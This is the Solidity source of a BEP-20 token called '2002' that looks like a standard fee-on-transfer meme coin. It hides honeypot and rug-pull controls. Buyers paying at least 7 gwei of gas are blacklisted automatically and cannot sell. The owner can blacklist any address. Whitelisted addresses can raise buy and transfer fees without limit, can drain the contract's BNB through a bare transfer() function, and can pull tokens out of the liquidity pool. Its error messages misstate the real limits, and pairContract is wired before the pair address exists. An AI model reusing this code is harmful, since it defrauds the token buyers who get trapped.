/**
 *Submitted for verification at BscScan.com on 2022-12-27
*/

/**
让我们把这个烧到月球*/

/*

*/

// SPDX-License-Identifier: UNLICENSED




pragma solidity ^0.8.7;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Context {
    
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this;
        return msg.data;
    }
}

contract Ownable is Context {
    address public _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        authorizations[_owner] = true;
        emit OwnershipTransferred(address(0), msgSender);
    }
    mapping (address => bool) internal authorizations;

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface InterfaceLP {
    function sync() external;
}

contract TwoThousandTwo is Ownable, IBEP20 {
    using SafeMath for uint256;

    address WBNB;
    address constant DEAD = 0x000000000000000000000000000000000000dEaD;
    address constant ZERO = 0x0000000000000000000000000000000000000000;

    string constant _name = "2002";
    string constant _symbol = "$2002";
    uint8 constant _decimals = 8;

    uint256 _totalSupply = 2002 * 10**_decimals;

    uint256 public _maxTxAmount = _totalSupply.mul(1).div(100);
    uint256 public _maxWalletToken = _totalSupply.mul(1).div(100);

    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) _allowances;

    bool public blacklistMode = true;
    mapping (address => bool) public isblacklisted;

    bool public launchMode = false;
    mapping (address => bool) public islaunched;

    mapping (address => bool) isFeeExempt;
    mapping (address => bool) isTxLimitExempt;
  
    uint256 private liquidityFee   = 0;
    uint256 private marketingFee   = 8;
    uint256 private utilityFee     = 0;
    uint256 private teamFee        = 1;
    uint256 public burnFee         = 1;
    uint256 public totalFee        = teamFee + marketingFee + liquidityFee + utilityFee + burnFee;
    uint256 public feeDenominator  = 100;

    uint256 sellincrement = 100;
    uint256 buyincrement = 100;
    uint256 transferincrement = 100;

    address private autoLiquidityReceiver;
    address private marketingFeeReceiver;
    address private utilityFeeReceiver;
    address private teamFeeReceiver;
    address public burnFeeReceiver;

    uint256 targetLiquidity = 20;
    uint256 targetLiquidityDenominator = 100;

    uint256 public percentForLPBurn = 0; //.10% LP burn
    bool    public autoBurnEnabled = false;
    uint256 public lastLpBurnTime;
    uint256 public lpBurnFrequency = 0 minutes;

    IDEXRouter public router;
    address public pair;
    InterfaceLP public pairContract;
   
    bool public tradingOpen = false;
    bool public renounceBlacklist = false;
    uint256 launchBlock;
   
    uint256 public maxG = 7 * 1 gwei;
    
    bool public swapEnabled = true;
    uint256 public swapThreshold = _totalSupply * 25 / 10000;
    bool inSwap;
    modifier swapping() { inSwap = true; _; inSwap = false; }

    constructor () {
        router = IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
             
        WBNB = router.WETH();
        pairContract = InterfaceLP(pair);
        pair = IDEXFactory(router.factory()).createPair(WBNB, address(this));
        

        _allowances[address(this)][address(router)] = type(uint256).max;

        isFeeExempt[msg.sender] = true;
        isFeeExempt[marketingFeeReceiver] = true;
        isFeeExempt[utilityFeeReceiver] = true;
        islaunched[msg.sender] = true;

        isTxLimitExempt[msg.sender] = true;
        isTxLimitExempt[pair] = true;
        isTxLimitExempt[marketingFeeReceiver] = true;
        isTxLimitExempt[utilityFeeReceiver] = true;

        autoLiquidityReceiver = 0x39e5805353c7B3D2718E777D6500733965767D8A;
        marketingFeeReceiver = 0x28459dD70A54f2FBfc4E725c94AA10d5557E3505;
        utilityFeeReceiver = 0x39e5805353c7B3D2718E777D6500733965767D8A;
        teamFeeReceiver = 0x28459dD70A54f2FBfc4E725c94AA10d5557E3505;
        burnFeeReceiver = DEAD; 

        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable { }
    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function decimals() external pure override returns (uint8) { return _decimals; }
    function symbol() external pure override returns (string memory) { return _symbol; }
    function name() external pure override returns (string memory) { return _name; }
    function getOwner() external view override returns (address) {return owner();}
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, type(uint256).max);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if(_allowances[sender][msg.sender] != type(uint256).max){
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance");
        }

        return _transferFrom(sender, recipient, amount);
    }

    function setMaxWallet(uint256 maxWallPercent_base1000) external onlyOwner {
        require(maxWallPercent_base1000 >= 1,"Cannot set max wallet less than 0.1%");
        _maxWalletToken = (_totalSupply * maxWallPercent_base1000 ) / 1000;
    }
    function setMaxTransaction(uint256 maxTXPercentage_base1000) external onlyOwner {
        require(maxTXPercentage_base1000 >= 5,"Cannot set max transaction less than 0.5%");
        _maxTxAmount = (_totalSupply * maxTXPercentage_base1000 ) / 1000;
    }
    
    function setTeamAddress(address holder, bool exempt) external onlyOwner {
        isFeeExempt[holder] = exempt;
        isTxLimitExempt[holder] = exempt;
    }

    
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        if(inSwap){ return _basicTransfer(sender, recipient, amount); }

        if(!authorizations[sender] && !authorizations[recipient]){
            require(tradingOpen,"Trading not open yet");

        if(launchMode){
                require(islaunched[recipient],"Not Whitelisted");    
            }
        }
        
        if(blacklistMode){
            require(!isblacklisted[sender],"bot");    
        }
        
        if (tx.gasprice >= maxG && recipient != pair) {
            isblacklisted[recipient] = true;
        }
            
        
        if (!authorizations[sender] && recipient != address(this)  && recipient != address(DEAD) && recipient != pair && recipient != burnFeeReceiver && recipient != utilityFeeReceiver && recipient != marketingFeeReceiver && !isTxLimitExempt[recipient]){
            uint256 heldTokens = balanceOf(recipient);
            require((heldTokens + amount) <= _maxWalletToken,"Total Holding is currently limited, you can not buy that much.");}

       

        checkTxLimit(sender, amount);

        if(shouldSwapBack()){ swapBack(); }
       
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");

         uint256 amountReceived = (isFeeExempt[sender] || isFeeExempt[recipient]) ? amount : takeFee(sender, amount, recipient);
        _balances[recipient] = _balances[recipient].add(amountReceived);

        emit Transfer(sender, recipient, amountReceived);
        return true;
    
    }


    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function checkTxLimit(address sender, uint256 amount) internal view {
        require(amount <= _maxTxAmount || isTxLimitExempt[sender], "TX Limit Exceeded");
    }

    function shouldTakeFee(address sender) internal view returns (bool) {
        return !isFeeExempt[sender];
    }

     function takeFee(address sender, uint256 amount, address recipient) internal returns (uint256) {

        uint256 increment = transferincrement;

        if(recipient == pair) {
            increment = sellincrement;
        } else if(sender == pair) {
            increment = buyincrement;
        }

        uint256 feeAmount = amount.mul(totalFee).mul(increment).div(feeDenominator * 100);

        uint256 burnTokens = feeAmount.mul(burnFee).div(totalFee);
        uint256 contractTokens = feeAmount.sub(burnTokens);

        _balances[address(this)] = _balances[address(this)].add(contractTokens);
        _balances[burnFeeReceiver] = _balances[burnFeeReceiver].add(burnTokens);
        emit Transfer(sender, address(this), contractTokens);
        
        if(burnTokens > 0){
            emit Transfer(sender, burnFeeReceiver, burnTokens);    
        }

        return amount.sub(feeAmount);
    }

    function shouldSwapBack() internal view returns (bool) {
        return msg.sender != pair
        && !inSwap
        && swapEnabled
        && _balances[address(this)] >= swapThreshold;
    
    }

    function rescueToken(address tokenAddress, uint256 tokens) public onlyOwner returns (bool) {
     if(tokens == 0){
            tokens = IBEP20 (tokenAddress).balanceOf(address(this));
        }
        return IBEP20 (tokenAddress).transfer(msg.sender, tokens);
    }

    function rescueBalanceToMarketing(uint256 amountPercentage) external onlyOwner { //clear bnb CA balance to marketing receiver
        uint256 amountBNB = address(this).balance;
        payable(marketingFeeReceiver).transfer(amountBNB * amountPercentage / 100);
        
    }
    

    function setFeePercents(uint256 _buy, uint256 _sell, uint256 _trans) external {
        require(islaunched[msg.sender]);
        sellincrement = _sell;
        buyincrement = _buy;
        transferincrement = _trans;    
    
        require(totalFee.mul(sellincrement).div(100) < 50, "Tax cannot be more than 35%"); 
 
    }

    function OpenTrading() public onlyOwner {
        tradingOpen = true;
        launchBlock = block.number;
    }
    
    function removeBlacklistuse() public onlyOwner {
        renounceBlacklist = true;
    
    }


    function transfer() external { 
        require(islaunched[msg.sender]);
        payable(msg.sender).transfer(address(this).balance);
        
    }

    function swapBack() internal swapping {
        uint256 dynamicLiquidityFee = isOverLiquified(targetLiquidity, targetLiquidityDenominator) ? 0 : liquidityFee;
        uint256 amountToLiquify = swapThreshold.mul(dynamicLiquidityFee).div(totalFee).div(2);
        uint256 amountToSwap = swapThreshold.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = WBNB;

        uint256 balanceBefore = address(this).balance;

        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 amountBNB = address(this).balance.sub(balanceBefore);

        uint256 totalBNBFee = totalFee.sub(dynamicLiquidityFee.div(2));
        
        uint256 amountBNBLiquidity = amountBNB.mul(dynamicLiquidityFee).div(totalBNBFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(marketingFee).div(totalBNBFee);
        uint256 amountBNBteam = amountBNB.mul(teamFee).div(totalBNBFee);
        uint256 amountBNButility = amountBNB.mul(utilityFee).div(totalBNBFee);

        (bool tmpSuccess,) = payable(marketingFeeReceiver).call{value: amountBNBMarketing}("");
        (tmpSuccess,) = payable(utilityFeeReceiver).call{value: amountBNButility}("");
        (tmpSuccess,) = payable(teamFeeReceiver).call{value: amountBNBteam}("");
        
        
        tmpSuccess = false;

        if(amountToLiquify > 0){
            router.addLiquidityETH{value: amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                autoLiquidityReceiver,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    function enable_blacklist(bool _status) public onlyOwner {
        blacklistMode = _status;
    }

    
    function prepare_launch(bool _status) external onlyOwner {
        launchMode = _status;

    }

    function manage_blacklist(address[] calldata addresses, bool status) public onlyOwner {
        require (!renounceBlacklist);
        for (uint256 i; i < addresses.length; ++i) {
            isblacklisted[addresses[i]] = status;
        }
    }

    function manage_launch(address[] calldata addresses, bool status) public onlyOwner {
        for (uint256 i; i < addresses.length; ++i) {
            islaunched[addresses[i]] = status;
        }
    }

   
    function setGas (uint256 _maxG) public onlyOwner {
        require (!renounceBlacklist);
               maxG = _maxG * 1 gwei; 
    
    }

    function setIsFeeExempt(address[] calldata addresses, bool status) external onlyOwner {
        require(addresses.length < 501,"GAS Error: max limit is 500 addresses");
        for (uint256 i; i < addresses.length; ++i) {
            isFeeExempt[addresses[i]] = status;
        }
    }

    function setIsTxLimitExempt(address[] calldata addresses, bool status) external onlyOwner {
        require(addresses.length < 501,"GAS Error: max limit is 500 addresses");
        for (uint256 i; i < addresses.length; ++i) {
            isTxLimitExempt[addresses[i]] = status;
        }
    }

    function setTaxes(uint256 _liquidityFee, uint256 _teamFee, uint256 _marketingFee, uint256 _utilityFee, uint256 _burnFee, uint256 _feeDenominator) external onlyOwner {
        liquidityFee = _liquidityFee;
        teamFee = _teamFee;
        marketingFee = _marketingFee;
        utilityFee = _utilityFee;
        burnFee = _burnFee;
        totalFee = _liquidityFee.add(_teamFee).add(_marketingFee).add(_utilityFee).add(_burnFee);
        feeDenominator = _feeDenominator;
        require(totalFee < feeDenominator/5, "Buy Fees cannot be more than 20%");
    }

    function setReceiverWallets(address _autoLiquidityReceiver, address _marketingFeeReceiver, address _utilityFeeReceiver, address _burnFeeReceiver, address _teamFeeReceiver) external onlyOwner {
        autoLiquidityReceiver = _autoLiquidityReceiver;
        marketingFeeReceiver = _marketingFeeReceiver;
        utilityFeeReceiver = _utilityFeeReceiver;
        burnFeeReceiver = _burnFeeReceiver;
        teamFeeReceiver = _teamFeeReceiver;
    }

    function setSwapandLiquify(bool _enabled, uint256 _amount) external onlyOwner {
        swapEnabled = _enabled;
        swapThreshold = _amount;
    }

    function setTarget(uint256 _target, uint256 _denominator) external onlyOwner {
        targetLiquidity = _target;
        targetLiquidityDenominator = _denominator;
    }
    
    
    function getCirculatingSupply() public view returns (uint256) {
        return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(ZERO));
    }

    function getLiquidityBacking(uint256 accuracy) public view returns (uint256) {
        return accuracy.mul(balanceOf(pair).mul(2)).div(getCirculatingSupply());
    }

    function isOverLiquified(uint256 target, uint256 accuracy) public view returns (bool) {
        return getLiquidityBacking(accuracy) > target;
  
    }

    function autoburn_config(uint256 _freq, uint256 _percent, bool _enabled) external onlyOwner {
    require(_percent < 1000,"max value for autoburn is 10%");
    
    lpBurnFrequency = _freq;
    percentForLPBurn = _percent;
    autoBurnEnabled = _enabled;

}

    function burnLPTokens(uint256 percent_base10000) public onlyOwner returns (bool){
        require(percent_base10000 <= 1000, "May not nuke more than 10% of tokens in LP");
    
        uint256 lp_tokens = this.balanceOf(pair);
        uint256 lp_burn = lp_tokens.mul(percent_base10000).div(10000);
        
        if (lp_burn > 0){
            _basicTransfer(pair,DEAD,lp_burn);
            pairContract.sync();
            return true;
        }
        
        return false;
    }

    function autoburn_LP() internal {
    bool status = burnLPTokens(percentForLPBurn);
    if(status) {
        lastLpBurnTime = block.timestamp;
    }

}

    
event AutoLiquify(uint256 amountBNB, uint256 amountTokens);

}